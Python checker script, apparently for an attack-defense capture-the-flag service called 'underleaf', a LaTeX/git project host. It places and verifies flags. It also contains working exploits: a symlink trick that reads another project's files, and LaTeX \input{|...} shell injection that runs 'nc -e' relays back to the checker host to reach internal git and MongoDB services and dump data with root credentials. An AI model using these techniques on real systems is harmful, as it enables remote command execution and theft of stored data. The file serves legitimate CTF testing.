import asyncio
import json
import os
import secrets
import subprocess
from logging import LoggerAdapter

import aiofiles
from enochecker3 import ChainDB, Enochecker, ExploitCheckerTaskMessage, FlagSearcher, GetflagCheckerTaskMessage, GetnoiseCheckerTaskMessage, MumbleException, PutflagCheckerTaskMessage, PutnoiseCheckerTaskMessage
from enochecker3.utils import assert_equals

from util import *

checker = Enochecker("underleaf", service_port)
def app(): return checker.app

@checker.putflag(0)
async def putflag_zero(task: PutflagCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> str:
    (username, password, _, id) = await create_user_and_project(client, db, logger)

    flag_text = """\\documentclass[12pt]{minimal}
\\usepackage{verbatim}
\\begin{document}
%""" + task.flag + """
\input{|"echo XGJlZ2lue3ZlcmJhdGltfQ== | base64 -d; cat main.tex; echo XGVuZHt2ZXJiYXRpbX0= | base64 -d"}
\end{document}
"""

    path = await clone_project(username, password, id, task.address, logger)

    check_file_path_is_not_mal(f"{path}/main.tex")
    open(f"{path}/main.tex", "w").write(flag_text)
    
    await os_succ(asyncio.create_subprocess_shell(f"ln -s main.tex {path}/main.tex.bak"), logger)

    await git_config_commit_and_push(path, username, "Minor changes to the layout.", logger)

    await cleanup_clone(path, logger)

    await pull(client, id, logger)

    logger.info("putflag_zero: success")

    return json.dumps({'project_id': id})


@checker.getflag(0)
async def getflag_zero(task: GetflagCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> str:
    try:
        (username, password) = await db.get("credentials")
    except KeyError:
        raise MumbleException("Missing database entry from putflag")

    await login_user(client, username, password, logger)

    try:
        (_, id) = await db.get("project")
    except KeyError:
        raise MumbleException("Missing database entry from putflag")

    await compile(client, id, "main.tex.bak", logger)
    pdf_bytes = await download_pdf(client, id, logger)
    
    file = f"/tmp/{id}.pdf"
    async with aiofiles.open(file, "wb") as f:
        await f.write(pdf_bytes)

    await os_succ(asyncio.create_subprocess_shell(f"pdftotext {file} {file}.txt"), logger)
    
    async with aiofiles.open(f"{file}.txt", "r") as f:
        output = await f.read()

    os.remove(f"{file}.txt")
    os.remove(file)
    
    if task.flag not in output:
        raise MumbleException("Flag not found")

    logger.info("getflag_zero: success")


@checker.exploit(0)
async def exploit_read_symlink(task: ExploitCheckerTaskMessage, client: AsyncClient, searcher: FlagSearcher, logger: LoggerAdapter) -> str:
    attack_info = json.loads(task.attack_info)
    if 'project_id' not in attack_info:
        raise MumbleException("Missing project_id in attack_info")
    
    f_id = attack_info['project_id']

    (username, password, _, id) = await create_user_and_project(client, None, logger)

    path = await clone_project(username, password, id, task.address, logger)

    assert_equals(os.path.exists(
        f"{path}/main.tex"), True, "file not created")

    # add a symlink
    target = f"/app/data/projects/{f_id[0:2]}/{f_id}/main.tex"
    await os_succ(asyncio.create_subprocess_shell(f"mkdir -p {target}/.. {dev_null}"), logger)
    await os_succ(asyncio.create_subprocess_shell(f"touch {target} {dev_null}"), logger)
    await os_succ(asyncio.create_subprocess_shell(f"ln -s {target} /tmp/{id}/link"), logger)
    await os_succ(asyncio.create_subprocess_shell(f"rm -rf {target} {dev_null}"), logger)

    await git_config_commit_and_push(path, username, "Exploit!", logger)

    await cleanup_clone(path, logger)

    # let the server pull the changes
    await pull(client, id, logger)

    # get flag
    file = await download_file(client, id, "link", logger)
    if flag := searcher.search_flag(file):
        return flag

@checker.exploit(1)
async def exploit_git_clone_from_container(task: ExploitCheckerTaskMessage, client: AsyncClient, searcher: FlagSearcher, logger: LoggerAdapter) -> str:
    (_, _, _, id) = await create_user_and_project(client, None, logger)

    attack_info = json.loads(task.attack_info)
    if 'project_id' not in attack_info:
        raise MumbleException("Missing project_id in attack_info")
    
    f_id = attack_info['project_id']

    # gizmo to forward a connection
    forward = subprocess.Popen(["ncat", "-lvnp", checker_forward_port_1, '-ke', '/usr/bin/ncat -lvnp 1234'], stdout=open(os.devnull, 'w'), stderr=subprocess.STDOUT)
    
    clone = subprocess.Popen(["bash", '-c', f"while true; do git clone http://127.0.0.1:1234/{f_id} /tmp/{f_id} &> /dev/null && break; done"])
    commands = f"while true; do nc {checker_ip} {checker_forward_port_1} -e \"/usr/bin/nc nginx-git 80\"; done"
    

    file_content = """\\documentclass[12pt]{minimal}
\\usepackage{verbatim}
\\begin{document}
    \\input{|"echo XGJlZ2lue3ZlcmJhdGltfQ== | base64 -d;""" + commands + """; echo XGVuZHt2ZXJiYXRpbX0= | base64 -d"}
\\end{document}
"""
    await upload_file(client, id, "main.tex", file_content, logger)
    await compile(client, id, "main.tex", logger, True)

    forward.kill()
    forward.wait()

    clone.kill()
    clone.wait()
 
    assert_equals(os.path.exists(
        f"/tmp/{f_id}/main.tex"), True, "file not downloaded")

    async with aiofiles.open(f"/tmp/{f_id}/main.tex", "r") as f:
        output = await f.read()
        

    await os_succ(asyncio.create_subprocess_shell(f"rm -rf /tmp/{f_id}"), logger)

    if flag := searcher.search_flag(output):
        return flag

@checker.putflag(1)
async def putflag_one(task: PutflagCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
    (username, _, _, _) = await create_user_and_project(client, db, logger, project_name=task.flag)
    return json.dumps({'username': username})

@checker.getflag(1)
async def getflag_one(task: GetflagCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> str:
    try:
        (username, password) = await db.get("credentials")
        (_, id) = await db.get('project')
    except KeyError:
        raise MumbleException("Missing database entry from putflag")

    await login_user(client, username, password, logger)

    projects = await list_projects(client, logger)
    for project in projects:
        if project["name"] == task.flag and project["id"] == id:
            return project["name"]
    
    raise MumbleException("Flag not found.")

@checker.exploit(2)
async def exploit_connect_to_mongodb(task: ExploitCheckerTaskMessage, client: AsyncClient, searcher: FlagSearcher, logger: LoggerAdapter):
    (_, _, _, id) = await create_user_and_project(client, None, logger)

    attack_info = json.loads(task.attack_info)
    if 'username' not in attack_info:
        raise MumbleException("Missing username in attack_info")

    # gizmo to forward a connection
    forward = subprocess.Popen(["ncat", "-lvnp", checker_forward_port_2, '-ke', '/usr/bin/ncat -lvnp 1234'], stdout=open(os.devnull, 'w'), stderr=subprocess.STDOUT)
    
    dump_command = "mongo --host 127.0.0.1 --port 1234 --username=root --password=password --eval 'DBQuery.shellBatchSize=1000000000; db.projects.find({}, {name:1})' &>> /tmp/dump.json"
    dump = subprocess.Popen(["bash", '-c', f"while true; do {dump_command} && break; done"])
    
    commands = f"while true; do nc {checker_ip} {checker_forward_port_2} -e \"/usr/bin/nc db 27017\"; done"
    
    file_content = """\\documentclass[12pt]{minimal}
\\usepackage{verbatim}
\\begin{document}
    \\input{|"echo XGJlZ2lue3ZlcmJhdGltfQ== | base64 -d;""" + commands + """; echo XGVuZHt2ZXJiYXRpbX0= | base64 -d"}
\\end{document}
"""
    await upload_file(client, id, "main.tex", file_content, logger)
    await compile(client, id, "main.tex", logger, True)

    forward.kill()
    forward.wait()

    dump.kill()
    dump.wait()
 
    if not os.path.exists("/tmp/dump.json"):
        raise MumbleException("Dump file not found")

    async with aiofiles.open("/tmp/dump.json", "r") as f:
        output = await f.read()

    await os_succ(asyncio.create_subprocess_shell("rm -rf /tmp/dump.json"), logger)

    if flag := searcher.search_flag(output):
        return flag

@checker.putnoise(0)
async def putnoise_file_content(task: PutnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter):
    (_, _, _, id) = await create_user_and_project(client, db, logger)

    noise_name = secrets.token_hex(16)
    noise = secrets.token_hex(32)

    await upload_file(client, id, noise_name, noise, logger)
    
    await commit(client, id, noise, logger)
    await push(client, id, logger)

    await db.set("noise", (noise_name, noise))
    logger.info("putnoise_file_content: success")


@checker.getnoise(0)
async def getnoise_file_content(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter):
    try:
        (username, password) = await db.get("credentials")
        (_, id) = await db.get("project")
        (noise_name, noise) = await db.get("noise")
    except KeyError:
        raise MumbleException("getnoise w/o putnoise")

    await login_user(client, username, password, logger)
    if await download_file(client, id, noise_name, logger) != noise:
        raise MumbleException()

    path = await clone_project(username, password, id, task.address, logger)

    assert_equals(os.path.exists(
        f"{path}/main.tex"), True, "file not created")

    proc = await asyncio.create_subprocess_shell(f"git -C {path} log | grep {noise}")
    await proc.wait()

    if proc.returncode != 0:
        raise MumbleException("noise not found")

    await cleanup_clone(path, logger)
    
    logger.info("getnoise_file_content: success")


if __name__ == "__main__":
    checker.run()
